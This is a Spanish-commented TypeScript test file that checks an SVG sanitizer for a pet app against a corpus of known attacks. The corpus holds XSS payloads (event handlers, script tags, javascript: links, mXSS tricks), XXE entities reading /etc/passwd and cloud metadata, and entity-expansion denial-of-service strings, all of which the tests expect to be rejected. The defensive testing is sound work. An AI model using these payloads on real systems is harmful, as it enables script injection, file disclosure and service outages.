import { describe, expect, it } from 'vitest';
import { InvalidPetSvgError } from '../DomainError.js';
import { SvgDeMascota, TIPO_DEL_SVG } from './SvgDeMascota.js';

/**
 * Un corpus de SVG maliciosos conocidos (SCRUM-155, S-13).
 *
 * El saneador de SVG es codigo propio, y un error en un saneador propio es una
 * XSS guardada: el SVG de una mascota lo ve cualquiera que abra la aplicacion de
 * esa persona. `SvgDeMascota.spec.ts` prueba cada regla y barre miles de
 * variaciones al azar; esto es otra cosa: **ataques que ya existen**, escritos
 * por quienes se dedican a esto, para que el saneador no dependa solo de lo que
 * se nos ocurrio a nosotros.
 *
 * Las familias vienen de tres fuentes publicas:
 *
 * - **OWASP XSS Filter Evasion Cheat Sheet**: la forma de escribir el mismo
 *   ataque para que pase un filtro (mayusculas, entidades, caracteres de
 *   control, comillas, saltos de linea en medio de la palabra).
 * - **PortSwigger XSS Cheat Sheet**, la parte de SVG: manejadores de eventos
 *   (`onload`, `onbegin`...), animaciones que cambian un enlace, `<use>` hacia
 *   un documento de fuera, `foreignObject`, la confusion de espacios de nombres
 *   que usan los ataques mXSS.
 * - **OWASP XXE Prevention Cheat Sheet** y los ataques de expansion de
 *   entidades (billion laughs, quadratic blowup).
 *
 * Estan reescritos para este saneador —las direcciones son `ejemplo.invalid`,
 * que no resuelve—, no copiados literalmente. Ninguno es un dibujo: **todos tienen
 * que rechazarse**. Si algun dia uno se acepta, o el saneador cambio y hay que
 * mirar por que, o la entrada es un falso positivo y se quita con su motivo.
 *
 * Agregar un ataque nuevo es agregar una fila. Si un SVG real se rechaza por
 * error, eso se arregla en `SvgDeMascota.spec.ts`, no aqui.
 */

const bytes = (texto: string): Uint8Array => new TextEncoder().encode(texto);

const XMLNS = 'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"';
const RAIZ = `<svg ${XMLNS} viewBox="0 0 100 100">`;
const svg = (interior: string): string => `${RAIZ}${interior}</svg>`;

interface Ataque {
  readonly familia: string;
  readonly nombre: string;
  readonly texto: string;
}

const alerta = 'alert(document.domain)';

const CORPUS: readonly Ataque[] = [
  // ---------- Manejadores de eventos en la raiz ----------
  {
    familia: 'OWASP: eventos',
    nombre: 'onload sin comillas',
    texto: `<svg ${XMLNS} viewBox="0 0 1 1" onload=${alerta}>`,
  },
  {
    familia: 'OWASP: eventos',
    nombre: 'onload separado por una barra, sin espacio',
    texto: `<svg/onload=${alerta} ${XMLNS} viewBox="0 0 1 1"/>`,
  },
  {
    familia: 'OWASP: eventos',
    nombre: 'onload con comillas',
    texto: `<svg ${XMLNS} viewBox="0 0 1 1" onload="${alerta}"/>`,
  },
  {
    familia: 'OWASP: eventos',
    nombre: 'onload con comillas simples y mayusculas',
    texto: `<svg ${XMLNS} viewBox="0 0 1 1" OnLoAd='${alerta}'/>`,
  },
  {
    familia: 'OWASP: eventos',
    nombre: 'onload con el codigo escrito con entidades',
    texto: `<svg ${XMLNS} viewBox="0 0 1 1" onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"/>`,
  },
  {
    familia: 'OWASP: eventos',
    nombre: 'onload con espacio en blanco antes del igual',
    texto: `<svg ${XMLNS} viewBox="0 0 1 1" onload ="${alerta}"/>`,
  },

  // ---------- Manejadores en otros elementos ----------
  ...[
    'onclick',
    'onmouseover',
    'onmouseenter',
    'onfocus',
    'onfocusin',
    'onactivate',
    'onbegin',
    'onend',
    'onrepeat',
    'onerror',
    'onabort',
    'onscroll',
    'onresize',
    'onunload',
    'onzoom',
    'onanimationstart',
    'ontoggle',
  ].map<Ataque>((evento) => ({
    familia: 'PortSwigger: eventos',
    nombre: `${evento} en una forma`,
    texto: svg(`<rect width="9" height="9" ${evento}="${alerta}"/>`),
  })),
  {
    familia: 'PortSwigger: eventos',
    nombre: 'onbegin en una animacion',
    texto: svg(`<animate onbegin=${alerta} attributeName="x" dur="1s"/>`),
  },
  {
    familia: 'PortSwigger: eventos',
    nombre: 'onbegin en un discard',
    texto: svg(`<discard onbegin="${alerta}"/>`),
  },
  {
    familia: 'PortSwigger: eventos',
    nombre: 'un manejador XML Events (ev:event)',
    texto: svg(
      `<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">${alerta}</handler>`,
    ),
  },
  {
    familia: 'PortSwigger: eventos',
    nombre: 'un listener XML Events',
    texto: svg(
      `<listener xmlns:ev="http://www.w3.org/2001/xml-events" event="load" handler="#h" observer="x"/>`,
    ),
  },

  // ---------- script ----------
  { familia: 'OWASP: script', nombre: 'script', texto: svg(`<script>${alerta}</script>`) },
  {
    familia: 'OWASP: script',
    nombre: 'script con mayusculas mezcladas',
    texto: svg(`<ScRiPt>${alerta}</ScRiPt>`),
  },
  {
    familia: 'OWASP: script',
    nombre: 'script con espacio antes de cerrar la etiqueta',
    texto: svg(`<script >${alerta}</script >`),
  },
  {
    familia: 'OWASP: script',
    nombre: 'script con un salto de linea dentro de la etiqueta',
    texto: svg(`<script\n>${alerta}</script\n>`),
  },
  {
    familia: 'OWASP: script',
    nombre: 'script con el codigo escrito con entidades',
    texto: svg('<script>alert&#40;1&#41;</script>'),
  },
  {
    familia: 'OWASP: script',
    nombre: 'script con un NUL partiendo la palabra',
    texto: svg(`<scr\u0000ipt>${alerta}</scr\u0000ipt>`),
  },
  {
    familia: 'OWASP: script',
    nombre: 'script dentro de CDATA',
    texto: svg(`<script><![CDATA[${alerta}]]></script>`),
  },
  {
    familia: 'PortSwigger: script',
    nombre: 'script que se carga de un data:',
    texto: svg('<script xlink:href="data:,alert(1)"/>'),
  },
  {
    familia: 'PortSwigger: script',
    nombre: 'script con href a otro sitio',
    texto: svg('<script href="https://ejemplo.invalid/x.js"/>'),
  },
  {
    familia: 'PortSwigger: script',
    nombre: 'script con el prefijo del espacio de nombres del SVG',
    texto: `<svg xmlns:s="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><s:script>${alerta}</s:script></svg>`,
  },
  {
    familia: 'PortSwigger: script',
    nombre: 'script en el espacio de nombres de XHTML',
    texto: svg(`<x:script xmlns:x="http://www.w3.org/1999/xhtml">${alerta}</x:script>`),
  },
  {
    familia: 'PortSwigger: script',
    nombre: 'script escondido entre los metadatos',
    texto: svg(`<metadata><rdf:RDF xmlns:rdf="x"><script>${alerta}</script></rdf:RDF></metadata>`),
  },

  // ---------- Enlaces ----------
  {
    familia: 'OWASP: javascript:',
    nombre: 'enlace con javascript:',
    texto: svg(`<a xlink:href="javascript:${alerta}"><text x="20" y="20">XSS</text></a>`),
  },
  {
    familia: 'OWASP: javascript:',
    nombre: 'javascript: con la primera letra como entidad',
    texto: svg(`<a href="&#x6A;avascript:${alerta}"><rect width="9" height="9"/></a>`),
  },
  {
    familia: 'OWASP: javascript:',
    nombre: 'javascript: con tabulador, salto de linea y retorno dentro de la palabra',
    texto: svg(`<a href="jav&#x09;ascr&#x0A;ipt&#x0D;:${alerta}"><rect width="9" height="9"/></a>`),
  },
  {
    familia: 'OWASP: javascript:',
    nombre: 'javascript: con espacios al principio',
    texto: svg(`<a href="  &#x20;javascript:${alerta}"><rect width="9" height="9"/></a>`),
  },
  {
    familia: 'OWASP: javascript:',
    nombre: 'javascript: en una forma que no deberia llevar href',
    texto: svg(`<rect width="9" height="9" href="javascript:${alerta}"/>`),
  },
  {
    familia: 'OWASP: javascript:',
    nombre: 'vbscript: y livescript:',
    texto: svg('<a href="vbscript:msgbox(1)"/><a href="livescript:alert(1)"/>'),
  },
  {
    familia: 'PortSwigger: animaciones',
    nombre: 'una animacion que cambia el href de un enlace a javascript:',
    texto: svg(
      `<a id="x"><text x="1" y="1">X</text></a><animate xlink:href="#x" attributeName="href" values="javascript:${alerta}"/>`,
    ),
  },
  {
    familia: 'PortSwigger: animaciones',
    nombre: 'un set que pone un href a javascript:',
    texto: svg(
      `<a><set attributeName="href" to="javascript:${alerta}"/><text x="1" y="1">X</text></a>`,
    ),
  },
  {
    familia: 'PortSwigger: animaciones',
    nombre: 'un set que pone un manejador',
    texto: svg(
      `<rect width="9" height="9"><set attributeName="onmouseover" to="${alerta}"/></rect>`,
    ),
  },
  {
    familia: 'PortSwigger: animaciones',
    nombre: 'animateTransform, animateMotion y animateColor',
    texto: svg(
      '<rect width="9" height="9"><animateTransform attributeName="transform" type="rotate" from="0" to="9" dur="1s"/><animateMotion path="M0,0 L9,9" dur="1s"/><animateColor attributeName="fill" from="red" to="blue" dur="1s"/></rect>',
    ),
  },

  // ---------- Documentos de fuera ----------
  {
    familia: 'PortSwigger: use',
    nombre: 'use que carga un SVG de otro sitio',
    texto: svg('<use xlink:href="https://ejemplo.invalid/x.svg#x"/>'),
  },
  {
    familia: 'PortSwigger: use',
    nombre: 'use con una direccion sin protocolo',
    texto: svg('<use xlink:href="//ejemplo.invalid/x.svg#x"/>'),
  },
  {
    familia: 'PortSwigger: use',
    nombre: 'use que carga un SVG en base64 con un manejador',
    texto: svg(
      '<use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyBvbmxvYWQ9J2FsZXJ0KDEpJy8+#x"/>',
    ),
  },
  {
    familia: 'PortSwigger: use',
    nombre: 'use que carga un SVG con un script escrito en la propia direccion',
    texto: svg(
      `<use xlink:href="data:image/svg+xml,%3Csvg id='x' xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E#x"/>`,
    ),
  },
  {
    familia: 'PortSwigger: use',
    nombre: 'una imagen de mapa de bits desde otro sitio (rastreo)',
    texto: svg('<image xlink:href="https://ejemplo.invalid/rastreo.png" width="1" height="1"/>'),
  },
  {
    familia: 'PortSwigger: use',
    nombre: 'una imagen con onerror',
    texto: svg(`<image href="x" onerror="${alerta}"/>`),
  },
  {
    familia: 'PortSwigger: use',
    nombre: 'una imagen con javascript:',
    texto: svg(`<image href="javascript:${alerta}"/>`),
  },
  {
    familia: 'PortSwigger: use',
    nombre: 'un degradado que hereda de un documento de fuera',
    texto: svg('<linearGradient id="g" xlink:href="https://ejemplo.invalid/g.svg#a"/>'),
  },

  // ---------- Contenido de otro mundo ----------
  {
    familia: 'PortSwigger: foreignObject',
    nombre: 'foreignObject con un body y onload',
    texto: svg(
      `<foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="${alerta}"/></foreignObject>`,
    ),
  },
  {
    familia: 'PortSwigger: foreignObject',
    nombre: 'foreignObject con un iframe y srcdoc',
    texto: svg(
      '<foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"/></foreignObject>',
    ),
  },
  {
    familia: 'PortSwigger: foreignObject',
    nombre: 'foreignObject con un formulario',
    texto: svg(
      '<foreignObject><form xmlns="http://www.w3.org/1999/xhtml" action="https://ejemplo.invalid/robar"><input name="x"/></form></foreignObject>',
    ),
  },
  {
    familia: 'PortSwigger: foreignObject',
    nombre: 'object y embed',
    texto: svg(
      '<foreignObject><object xmlns="http://www.w3.org/1999/xhtml" data="https://ejemplo.invalid/x"/><embed xmlns="http://www.w3.org/1999/xhtml" src="https://ejemplo.invalid/x"/></foreignObject>',
    ),
  },
  {
    familia: 'PortSwigger: mXSS',
    nombre: 'confusion de espacios de nombres: un style que cierra y abre un img',
    texto: svg('</p><style><a id="</style><img src=1 onerror=alert(1)>"></style>'),
  },
  {
    familia: 'PortSwigger: mXSS',
    nombre: 'math con un enlace a un data: de HTML',
    texto: svg('<math><mi xlink:href="data:x,<script>alert(1)</script>"/></math>'),
  },
  {
    familia: 'PortSwigger: mXSS',
    nombre: 'un title que abre un CDATA y esconde un script',
    texto: svg(`<title><![CDATA[</title><script>${alerta}</script>]]></title>`),
  },
  {
    familia: 'PortSwigger: mXSS',
    nombre: 'un desc que abre un CDATA y esconde un script',
    texto: svg(`<desc><![CDATA[</desc><script>${alerta}</script>]]></desc>`),
  },

  // ---------- Estilos ----------
  {
    familia: 'OWASP: estilos',
    nombre: 'style con @import',
    texto: svg('<style>@import url(//ejemplo.invalid/x.css);</style>'),
  },
  {
    familia: 'OWASP: estilos',
    nombre: 'style con javascript: dentro de url()',
    texto: svg(`<style>*{background:url(javascript:${alerta})}</style>`),
  },
  {
    familia: 'OWASP: estilos',
    nombre: 'style con una animacion que dispara un evento',
    texto: svg(
      `<style>@keyframes x{}</style><rect width="9" height="9" style="animation-name:x" onanimationstart="${alerta}"/>`,
    ),
  },
  {
    familia: 'OWASP: estilos',
    nombre: 'atributo style con expression()',
    texto: svg(`<rect width="9" height="9" style="width:expression(${alerta})"/>`),
  },
  {
    familia: 'OWASP: estilos',
    nombre: 'atributo style con -moz-binding',
    texto: svg('<rect width="9" height="9" style="-moz-binding:url(//ejemplo.invalid/x.xml#b)"/>'),
  },
  {
    familia: 'OWASP: estilos',
    nombre: 'atributo style con url escrito en hexadecimal',
    texto: svg('<rect width="9" height="9" style="fill:\\75\\72\\6c(https://ejemplo.invalid/a)"/>'),
  },
  {
    familia: 'OWASP: estilos',
    nombre: 'fill con url() hacia otro sitio',
    texto: svg('<rect width="9" height="9" fill="url(https://ejemplo.invalid/a.svg#g)"/>'),
  },
  {
    familia: 'OWASP: estilos',
    nombre: 'fill con url(javascript:)',
    texto: svg(`<rect width="9" height="9" fill="url(javascript:${alerta})"/>`),
  },
  {
    familia: 'OWASP: estilos',
    nombre: 'clip-path con url() hacia otro sitio',
    texto: svg('<g clip-path="url(//ejemplo.invalid/a.svg#c)"><rect width="9" height="9"/></g>'),
  },

  // ---------- XML ----------
  {
    familia: 'OWASP XXE: archivos',
    nombre: 'entidad externa que lee /etc/passwd',
    texto: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>${svg('<g id="&xxe;"/>')}`,
  },
  {
    familia: 'OWASP XXE: archivos',
    nombre: 'entidad externa que lee un archivo de Windows',
    texto: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>${svg('<g id="&xxe;"/>')}`,
  },
  {
    familia: 'OWASP XXE: archivos',
    nombre: 'entidad externa hacia la red interna',
    texto: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>${svg('<g id="&xxe;"/>')}`,
  },
  {
    familia: 'OWASP XXE: archivos',
    nombre: 'entidad de parametro con un DTD de otro sitio (fuera de banda)',
    texto: `<!DOCTYPE svg [<!ENTITY % remoto SYSTEM "https://ejemplo.invalid/x.dtd">%remoto;]>${svg('<g/>')}`,
  },
  {
    familia: 'OWASP XXE: archivos',
    nombre: 'DTD externo',
    texto: `<!DOCTYPE svg SYSTEM "https://ejemplo.invalid/x.dtd">${svg('<g/>')}`,
  },
  {
    familia: 'OWASP XXE: archivos',
    nombre: 'XInclude',
    texto: svg(
      '<g xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></g>',
    ),
  },
  {
    familia: 'OWASP XXE: archivos',
    nombre: 'una hoja de estilos XSLT',
    texto: `<?xml-stylesheet type="text/xsl" href="https://ejemplo.invalid/x.xsl"?>${svg('<g/>')}`,
  },
  {
    familia: 'OWASP DoS: entidades',
    nombre: 'billion laughs',
    texto:
      '<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa">' +
      '<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">' +
      '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">' +
      '<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">' +
      '<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">]>' +
      svg('<g id="&e;"/>'),
  },
  {
    familia: 'OWASP DoS: entidades',
    nombre: 'quadratic blowup',
    texto: `<!DOCTYPE svg [<!ENTITY x "${'a'.repeat(4000)}">]>${svg(`<g id="${'&x;'.repeat(2000)}"/>`)}`,
  },
  {
    familia: 'OWASP DoS: entidades',
    nombre: 'una entidad que se llama a si misma',
    texto: `<!DOCTYPE svg [<!ENTITY a "&a;">]>${svg('<g id="&a;"/>')}`,
  },

  // ---------- Codificaciones ----------
  {
    familia: 'OWASP: codificacion',
    nombre: 'UTF-7 declarado',
    texto: `<?xml version="1.0" encoding="UTF-7"?>${svg('<g/>')}+ADw-script+AD4-alert(1)+ADw-/script+AD4-`,
  },
  {
    familia: 'OWASP: codificacion',
    nombre: 'UTF-16 declarado',
    texto: `<?xml version="1.0" encoding="UTF-16"?>${svg(`<script>${alerta}</script>`)}`,
  },
  {
    familia: 'OWASP: codificacion',
    nombre: 'caracteres de control dentro de javascript:',
    texto: svg(`<a href="java\u0001script:${alerta}"><rect width="9" height="9"/></a>`),
  },
  {
    familia: 'OWASP: codificacion',
    nombre: 'espacio de ancho cero partiendo javascript:',
    texto: svg(`<a href="java\u200Bscript:${alerta}"><rect width="9" height="9"/></a>`),
  },
];

function intentar(texto: string): { aceptado: string } | { rechazo: unknown } {
  try {
    return {
      aceptado: new TextDecoder().decode(SvgDeMascota.crear(bytes(texto), TIPO_DEL_SVG).contenido),
    };
  } catch (error) {
    return { rechazo: error };
  }
}

describe('el corpus de SVG maliciosos conocidos (S-13)', () => {
  it('es lo bastante grande para significar algo', () => {
    expect(CORPUS.length).toBeGreaterThanOrEqual(85);
    expect(new Set(CORPUS.map((ataque) => ataque.familia)).size).toBeGreaterThanOrEqual(10);
  });

  it('no repite ningun ataque', () => {
    expect(new Set(CORPUS.map((ataque) => ataque.texto)).size).toBe(CORPUS.length);
  });

  it.each(CORPUS.map((ataque) => [ataque.familia, ataque.nombre, ataque.texto] as const))(
    '[%s] %s se rechaza con un error del dominio',
    (_familia, _nombre, texto) => {
      const resultado = intentar(texto);

      // Si se acepto, el mensaje ensena lo que salio para poder juzgarlo.
      expect('rechazo' in resultado ? 'rechazado' : `ACEPTADO: ${resultado.aceptado}`).toBe(
        'rechazado',
      );
      expect((resultado as { rechazo: unknown }).rechazo).toBeInstanceOf(InvalidPetSvgError);
    },
  );

  it('ningun rechazo es un error inesperado: ni TypeError, ni RangeError, ni un cuelgue', () => {
    const inicio = Date.now();

    for (const ataque of CORPUS) {
      const resultado = intentar(ataque.texto);

      expect('rechazo' in resultado, ataque.nombre).toBe(true);
      expect((resultado as { rechazo: unknown }).rechazo, ataque.nombre).toBeInstanceOf(
        InvalidPetSvgError,
      );
    }

    // Los de expansion de entidades son los que pueden colgar un lector.
    expect(Date.now() - inicio).toBeLessThan(5000);
  });

  it('el mensaje del error no repite lo que traia el ataque', () => {
    for (const ataque of CORPUS) {
      const resultado = intentar(ataque.texto);
      const mensaje = 'rechazo' in resultado ? String((resultado.rechazo as Error).message) : '';

      expect(mensaje, ataque.nombre).not.toMatch(
        /alert|ejemplo\.invalid|passwd|win\.ini|169\.254/i,
      );
    }
  });
});

describe('lo que en XML no es un ataque: se acepta, pero lo que sale sale limpio', () => {
  // Para un lector de HTML `<!-->` es un comentario vacio y lo que sigue se
  // ejecuta; para uno de XML es un comentario que dura hasta `-->`. El SVG se
  // lee como XML, asi que aqui no hay script. Lo que importa es que el resultado
  // se reescribe desde cero: no queda nada del comentario ni de su contenido.
  it.each([
    [
      'un comentario que esconde un script para un lector de HTML',
      `<!--><script>${alerta}</script>-->`,
    ],
    ['un comentario con un script dentro', `<!-- <script>${alerta}</script> -->`],
  ])('%s', (_cual, interior) => {
    const resultado = intentar(svg(interior));

    expect('aceptado' in resultado).toBe(true);

    const salida = (resultado as { aceptado: string }).aceptado;

    expect(salida).not.toMatch(/script|alert|<!/i);
  });
});

describe('y lo bueno sigue pasando', () => {
  // Un saneador que rechaza todo tambien pasa el corpus. Esto lo impide.
  it.each([
    ['un circulo', svg('<circle cx="50" cy="50" r="40" fill="#ffd166" stroke="#333"/>')],
    [
      'un degradado',
      svg(
        '<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/><stop offset="1" stop-color="#000"/></linearGradient></defs><rect width="100" height="100" fill="url(#g)"/>',
      ),
    ],
    [
      'formas reutilizadas con use',
      svg(
        '<defs><circle id="c" r="5"/></defs><use href="#c" x="10" y="10"/><use href="#c" x="30"/>',
      ),
    ],
    ['un trazo', svg('<path d="M10 10 C 20 20, 40 20, 50 10" fill="none" stroke="#123456"/>')],
  ])('%s', (_cual, texto) => {
    const resultado = intentar(texto);

    expect('aceptado' in resultado).toBe(true);
  });
});
